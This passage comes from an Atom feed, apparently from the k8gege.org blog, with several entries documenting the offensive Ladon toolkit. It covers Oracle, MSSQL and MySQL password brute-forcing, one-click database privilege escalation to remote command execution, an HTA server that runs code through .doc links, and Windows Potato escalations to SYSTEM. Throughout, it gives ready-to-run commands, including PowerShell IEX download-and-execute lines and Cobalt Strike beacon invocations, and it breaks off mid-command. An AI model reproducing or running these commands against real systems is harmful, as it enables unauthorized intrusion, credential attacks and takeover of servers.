+    <content type="html"><![CDATA[<p style="color:#fff;"> <% <span class="archive-article-date">Visit <span id="busuanzi_value_page_pv"></span></span>%></p><p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/OracleScan.html";</script><h3 id="1521端口-Oracle数据库密码爆破">1521端口 Oracle数据库密码爆破</h3><p>Oracle不同于MS SQL Server和Mysql数据库，可对用户配置权限<br>数据库名不对，是无法连接上数据库的，比方说你获取到的密码<br>是oracle admin123 只允许连接db888数据库 就是所说的SID<br>但是网上很多工具都是使用默认的orcl数据库 导致无法爆破<br>有可能会因此错过很多Oracle数据库机器权限</p><p>PS：SQL Server不指定数据库名也可以连 权限不够最多读取不了对应库的数据而已<br>但是填写默认的master库，即使是最低权限，也可连接上，就可用来验证爆破密码<br>而Oracle不行，填写默认的orcl，非授权用户是连不上的 不指定时Ladon默认跑orcl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 OracleScan</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/OracleScan_up.png" alt="使用http访问查看图片"></p><h4 id="配置密码爆破参数">配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认<br>4  Oracle数据库，需要放个sid.txt里面存放数据库名称，Ladon先检测数据库存在才爆破</p><p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p><h4 id="数据库口令检测">数据库口令检测</h4><p>数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行</p><h5 id="mssql密码验证">mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>check.txt<br>192.168.1.8 1433 master sa k8gege<br>192.168.1.8 sa k8gege<br>192.168.1.8 1433 sa k8gege<br>命令: Ladon MssqlScan</p><h5 id="oracle同理">oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OracleScan</p><h5 id="mysql无需指定数据库名">mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MysqlScan</p><h3 id="PowerLadon">PowerLadon</h3><h4 id="远程加载OracleScan-1521端口弱口令爆破">远程加载OracleScan 1521端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon.ps1">http://192.168.1.3:800/Ladon.ps1</a>’); Ladon 192.168.1.141 OracleScan”</p><h3 id="Kali、Linux、Mac、路由器等操作系统">Kali、Linux、Mac、路由器等操作系统</h3><p>./Ladon 192.168.1.8/24 OracleScan<br><img src="/k8img/Ladon/OracleScan_up.png" alt="使用http访问查看图片"></p><h3 id="Oracle数据库远程提权工具">Oracle数据库远程提权工具</h3><p>12.15<br>[+]OracleCmd2Oracle数据库远程提权工具2 官方驱动&gt;=net 4.8 大小4.9M不内置</p><p>Ladon 12.2  12.14<br>[+]OracleCmdOracle数据库远程提权工具 3种方法一键提权<br>支持Windows/Linux/MacOS等服务器操作系统<br>支持高版本Oracle 12G、11G、12G及之前版本</p><p>GUI版 填写用户密码 Oracle一键提权远程执行命令<br><img src="/k8img/Ladon/OracleStudy.png" alt="使用http访问查看图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon OracleCmd 192.168.50.18 1521 orcl admin K8gege520 m3 <span class="built_in">whoami</span></span><br><span class="line">Ladon OracleCmd 192.168.50.18 1521 orcl admin K8gege520 m2 <span class="built_in">whoami</span></span><br><span class="line">Ladon OracleCmd 192.168.50.18 1521 orcl admin K8gege520 m1 <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">Ladon OracleCmd2 192.168.50.18 1521 orcl admin K8gege520 <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/OracleCmd.png" alt="使用http访问查看图片"></p><p><img src="/k8img/Ladon/OracleCmd2.png" alt="使用http访问查看图片"></p><h3 id="工具下载">工具下载</h3><p>最新版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p style=&quot;color:#fff;&quot;&gt; 
+&lt;% 
+&lt;span class=&quot;archive-article-date&quot;&gt;
+Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
+&lt;/span&gt;
+%&gt;
+&lt;/p&gt;
+&lt;p&gt;========</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ladon渗透SQL Server数据库一键提权 密码爆破</title>
+    <link href="http://k8gege.org/p/MssqlScan.html"/>
+    <id>http://k8gege.org/p/MssqlScan.html</id>
+    <published>2023-12-14T06:20:00.000Z</published>
+    <updated>2025-04-18T15:24:55.565Z</updated>
+    
+    <content type="html"><![CDATA[<p style="color:#fff;"> <% <span class="archive-article-date">Visit <span id="busuanzi_value_page_pv"></span></span>%></p><p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/MssqlScan.html";</script><h3 id="1433端口-Mssql数据库密码爆破">1433端口 Mssql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MssqlScan</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/MysqlScan_up.png" alt="使用http访问查看图片"></p><h4 id="配置密码爆破参数">配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p><p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p><h4 id="数据库口令检测">数据库口令检测</h4><h5 id="mssql密码验证">mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>check.txt<br>192.168.1.8 1433 master sa k8gege<br>192.168.1.8 sa k8gege<br>192.168.1.8 1433 sa k8gege<br>命令: Ladon MssqlScan</p><h5 id="Oracle同理">Oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OrcleScan</p><h5 id="Mysql无需指定数据库名">Mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MssqlScan</p><h3 id="PowerLadon">PowerLadon</h3><h4 id="远程加载MysqlScan-1521端口弱口令爆破">远程加载MysqlScan 1521端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon.ps1">http://192.168.1.3:800/Ladon.ps1</a>’); Ladon 192.168.1.141 MysqlScan”</p><h3 id="Kali、Linux、Mac、路由器等操作系统">Kali、Linux、Mac、路由器等操作系统</h3><p>./Ladon 192.168.1.8/24 MysqlScan<br><img src="/k8img/Ladon/MysqlScan_up.png" alt="使用http访问查看图片"></p><h3 id="Mssql数据库远程提权工具">Mssql数据库远程提权工具</h3><p><img src="/k8img/Ladon/LadonStudy.png" alt="使用http访问查看图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">本地:</span><br><span class="line"></span><br><span class="line">Ladon MssqlCmd host info</span><br><span class="line">Ladon MssqlCmd host open_shell</span><br><span class="line">Ladon MssqlCmd host close_shell</span><br><span class="line">Ladon MssqlCmd host xp_cmdshell cmdline</span><br><span class="line">Ladon MssqlCmd host ws_shell cmdline</span><br><span class="line">Ladon MssqlCmd host r_shell cmdline</span><br><span class="line">Ladon MssqlCmd host py_shell cmdline</span><br><span class="line">Ladon MssqlCmd host install_clr</span><br><span class="line">Ladon MssqlCmd host uninstall_clr</span><br><span class="line">Ladon MssqlCmd host clr_exec cmdline</span><br><span class="line">Ladon MssqlCmd host clr_efspotato cmdline</span><br><span class="line">Ladon MssqlCmd host clr_badpotato cmdline</span><br><span class="line"></span><br><span class="line">远程:</span><br><span class="line"></span><br><span class="line">Ladon MssqlCmd host user pass master info</span><br><span class="line">Ladon MssqlCmd host port user pass master open_shell</span><br><span class="line">Ladon MssqlCmd host port user pass master close_shell</span><br><span class="line">Ladon MssqlCmd host user pass master xp_cmdshell cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master ws_shell cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master r_shell cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master py_shell cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master install_clr</span><br><span class="line">Ladon MssqlCmd host user pass master uninstall_clr</span><br><span class="line">Ladon MssqlCmd host user pass master clr_exec cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master clr_efspotato cmdline</span><br><span class="line">Ladon MssqlCmd host user pass master clr_badpotato cmdline</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/MssqlCmd.png" alt="使用http访问查看图片"></p><h4 id="Cobalt-Strike">Cobalt Strike</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">本机:</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host info</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host open_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host close_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host xp_cmdshell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host ws_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host r_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host py_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host install_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host uninstall_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host clr_exec cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host clr_efspotato cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host clr_badpotato cmdline</span><br><span class="line"></span><br><span class="line">远程:</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master info</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host port user pass master open_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host port user pass master close_shell</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master xp_cmdshell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master ws_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master r_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master py_shell cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master install_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master uninstall_clr</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master clr_exec cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master clr_efspotato cmdline</span><br><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd host user pass master clr_badpotato cmdline</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="工具下载">工具下载</h3><p>最新版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p style=&quot;color:#fff;&quot;&gt; 
+&lt;% 
+&lt;span class=&quot;archive-article-date&quot;&gt;
+Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
+&lt;/span&gt;
+%&gt;
+&lt;/p&gt;
+&lt;p&gt;========</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ladon渗透Mysql数据库一键提权 密码爆破</title>
+    <link href="http://k8gege.org/p/MysqlScan.html"/>
+    <id>http://k8gege.org/p/MysqlScan.html</id>
+    <published>2023-12-14T06:20:00.000Z</published>
+    <updated>2025-04-18T15:24:55.790Z</updated>
+    
+    <content type="html"><![CDATA[<p style="color:#fff;"> <% <span class="archive-article-date">Visit <span id="busuanzi_value_page_pv"></span></span>%></p><p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/MysqlScan.html";</script><h3 id="3306端口-Mysql数据库密码爆破">3306端口 Mysql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MysqlScan</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/MysqlScan_up.png" alt="使用http访问查看图片"></p><h4 id="配置密码爆破参数">配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p><p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p><h4 id="数据库口令检测">数据库口令检测</h4><h5 id="mssql密码验证">mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>check.txt<br>192.168.1.8 1433 master sa k8gege<br>192.168.1.8 sa k8gege<br>192.168.1.8 1433 sa k8gege<br>命令: Ladon MssqlScan</p><h5 id="Oracle同理">Oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OrcleScan</p><h5 id="Mysql无需指定数据库名">Mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MssqlScan</p><h3 id="PowerLadon">PowerLadon</h3><h4 id="远程加载MysqlScan-1521端口弱口令爆破">远程加载MysqlScan 1521端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon.ps1">http://192.168.1.3:800/Ladon.ps1</a>’); Ladon 192.168.1.141 MysqlScan”</p><h3 id="Kali、Linux、Mac、路由器等操作系统">Kali、Linux、Mac、路由器等操作系统</h3><p>./Ladon 192.168.1.8/24 MysqlScan<br><img src="/k8img/Ladon/MysqlScan_up.png" alt="使用http访问查看图片"></p><h3 id="Mysql数据库远程提权工具">Mysql数据库远程提权工具</h3><p><img src="/k8img/Ladon/MysqlStudy.png" alt="使用http访问查看图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/MysqlCmd.png" alt="使用http访问查看图片"></p><h3 id="工具下载">工具下载</h3><p>最新版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p style=&quot;color:#fff;&quot;&gt; 
+&lt;% 
+&lt;span class=&quot;archive-article-date&quot;&gt;
+Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
+&lt;/span&gt;
+%&gt;
+&lt;/p&gt;
+&lt;p&gt;========</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ladon渗透 HTA服务器 访问DOC执行HTA</title>
+    <link href="http://k8gege.org/p/HtaSer.html"/>
+    <id>http://k8gege.org/p/HtaSer.html</id>
+    <published>2023-12-05T14:34:00.000Z</published>
+    <updated>2025-04-18T15:24:46.550Z</updated>
+    
+    <content type="html"><![CDATA[<p>Ladon for Kali/Ubuntu/Mac/Centos/Router/MIPS/ARM</p><h3 id="HTA服务器-一键启动-访问DOC也能执行HTA">HTA服务器 一键启动 访问DOC也能执行HTA</h3><p>Ladon和LadonGO用法一致 不限制后缀 访问doc也能执行hta</p><h5 id="Ladon命令">Ladon命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon HtaSer</span><br><span class="line">Ladon HtaSer 8080</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/HtaSer.PNG" alt="使用http访问查看图片"></p><h5 id="Kali启动">Kali启动</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./Ladon HtaSer</span><br><span class="line">./Ladon HtaSer 8080</span><br></pre></td></tr></table></figure><p><img src="/k8img/LadonGo/HtaSer.PNG" alt="使用http访问查看图片"></p><h5 id="HtaSer-exe">HtaSer.exe</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HtaSer</span><br><span class="line">HtaSer 8080</span><br></pre></td></tr></table></figure><h3 id="Download">Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>9.1.1：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>12.0：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;Ladon for Kali/Ubuntu/Mac/Centos/Router/MIPS/ARM&lt;/p&gt;
+&lt;h3 id=&quot;HTA服务器-一键启动-访问DOC也能执行HTA&quot;&gt;HTA服务器 一键启动 访问DOC也能执行HTA&lt;/h3&gt;
+&lt;p&gt;Ladon和LadonGO用法一致</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="0day" scheme="http://k8gege.org/tags/0day/"/>
+    
+    <category term="hta" scheme="http://k8gege.org/tags/hta/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>〖教程〗Ladon渗透5个Potato提权</title>
+    <link href="http://k8gege.org/p/potato.html"/>
+    <id>http://k8gege.org/p/potato.html</id>
+    <published>2023-11-19T16:08:00.000Z</published>
+    <updated>2025-04-18T15:24:57.608Z</updated>
+    
+    <content type="html"><![CDATA[<h1>Ladon提权之PipePotato/BadPotato/EfsPotato/GodPotato/McpPotato/SweetPotato/PrintSpoofer</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/potato.html";</script><p>Ladon提权之PipePotato/BadPotato/SweetPotato/PrintSpoofer</p><h3 id="版本">版本</h3><p>&gt;= Ladon 7.2.0<br>Update: 20200810</p><h3 id="Potato提权原理">Potato提权原理</h3><p>通过各种方法在本地NTLM中继获取SYSTEM令牌，再通过模拟令牌执行命令，通过以上方法提权统称为potato(不管是否基于原potato修改)。就像SQL注入，通过特定SQL语句注入获取特定数据库信息统称为SQL注入，而不管如何编写的SQL语句，是否基于别人的SQL语句修改。</p><h3 id="提权条件">提权条件</h3><p>1 本地NTLM中继获取SYSTEM令牌<br>2 SeImpersonatePrivilege特权</p><p>测试中任意用户都可以通过本地NTLM中继获取到SYSTEM令牌权限，但是由于USER默认不开户SeImpersonatePrivilege特权，无法模拟令牌创建进程无法执行命令，所以会导致很多Potato提权失败。如下方”Win7管理员提权至SYSTEM“图片上部分就是USER部分的Potato提权失败，下方是管理员权限，而其它环境都是IIS权限。所以为了方便Ladon默认也显示当前用户SeImpersonatePrivilege特权情况。</p><h3 id="SweetPotato">SweetPotato</h3><p>SweetPotato集成了原版Potato和JulyPotato的功能，包含DCOM/WINRM/PrintSpoofer方法获取SYSTEM。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Load SweetPotato</span><br><span class="line">Local Privilege Escalation from Windows Service Accounts to SYSTEM</span><br><span class="line">Vulnerable: Win7-Win10/Win2008-2019</span><br><span class="line">Usage:</span><br><span class="line">Ladon SweetPotato cmdline</span><br></pre></td></tr></table></figure><h3 id="PrintSpoofer">PrintSpoofer</h3><p>pipePotato:一种新型的通用提权漏洞，PrintSpoofer是一个利用打印机PIPE提权的方法，国人写了个工具叫BadPotato。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Load BadPotato</span><br><span class="line">Local Privilege Escalation from Windows Service Accounts to SYSTEM</span><br><span class="line">PrintSpoofer Abusing Impersonate Privileges.</span><br><span class="line">Vulnerable: Win8-Win10/Win2012-2019</span><br><span class="line">Usage:</span><br><span class="line">Ladon BadPotato cmdline</span><br></pre></td></tr></table></figure><h3 id="测试环境">测试环境</h3><p>1 Win7 IIS 应用池用户权限<br>2 Win7 本地管理员用户权限<br>3 Win2012 IIS 应用池权限<br>4 Win7 本地服务用户权限<br>5 Win8 本地服务用户权限</p><p>PS：由于BadPotato不支持WIN7系统，所以以上环境主要以测试SweetPotato为主。</p><h4 id="Win7管理员提权至SYSTEM">Win7管理员提权至SYSTEM</h4><p><img src="/k8img/Ladon/exp/lpe/Win7_Admin_SweetPotato.PNG" alt="使用http访问查看图片"></p><h4 id="Win7-IIS应用池提权至SYSTEM">Win7 IIS应用池提权至SYSTEM</h4><p><img src="/k8img/Ladon/exp/lpe/IIS_Win7_SweetPotato.PNG" alt="使用http访问查看图片"></p><h4 id="2012-R2-IIS应用池提权至SYSTEM">2012 R2 IIS应用池提权至SYSTEM</h4><p><img src="/k8img/Ladon/exp/lpe/IIS8_2012_PR.PNG" alt="使用http访问查看图片"></p><h4 id="WIN7服务用户CS提权至SYSTEM">WIN7服务用户CS提权至SYSTEM</h4><p>本地服务用户权限下直接以SYSTEM权限上控Cobalt Strike<br><img src="/k8img/Ladon/exp/lpe/CS_PR_SweetPotato.png" alt="使用http访问查看图片"></p><h4 id="WIN8服务用户提权至SYSTEM">WIN8服务用户提权至SYSTEM</h4><p><img src="/k8img/Ladon/exp/lpe/BadPotato.png" alt="使用http访问查看图片"></p><h3 id="IIS提权">IIS提权</h3><p><a href="http://k8gege.org/p/6b9b3afe.html">http://k8gege.org/p/6b9b3afe.html</a></p><h3 id="Ladon五个Potato提权命令">Ladon五个Potato提权命令</h3><p>Ladon &gt;= 12.2</p><h5 id="117-BadPotato服务用户提权至SYSTEM">117 BadPotato服务用户提权至SYSTEM</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BadPotato cmdline</span><br></pre></td></tr></table></figure><h5 id="118-SweetPotato服务用户提权至SYSTEM">118 SweetPotato服务用户提权至SYSTEM</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon SweetPotato cmdline</span><br></pre></td></tr></table></figure><h5 id="119-EfsPotato-Win7-2019提权-服务用户权限提到system">119 EfsPotato Win7-2019提权(服务用户权限提到system)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon EfsPotato <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><h5 id="235-Win11-2022系统提权至system权限">235 Win11/2022系统提权至system权限</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon McpPotato <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><h5 id="221-GodPotato提权Win8-Win11-Win2012-Win2022">221 GodPotato提权Win8-Win11 Win2012-Win2022</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon GodPotato <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><h5 id="190-MssqlCmd-SQL-Server数据库远程efspotato、badpotato提权">190 MssqlCmd SQL Server数据库远程efspotato、badpotato提权</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon MssqlCmd 192.168.1.8 sa k8gege520 master install_clr</span><br><span class="line">Ladon MssqlCmd 192.168.1.8 sa k8gege520 master uninstall_clr</span><br><span class="line">Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_exec <span class="built_in">whoami</span></span><br><span class="line">Ladon MssqlCmd 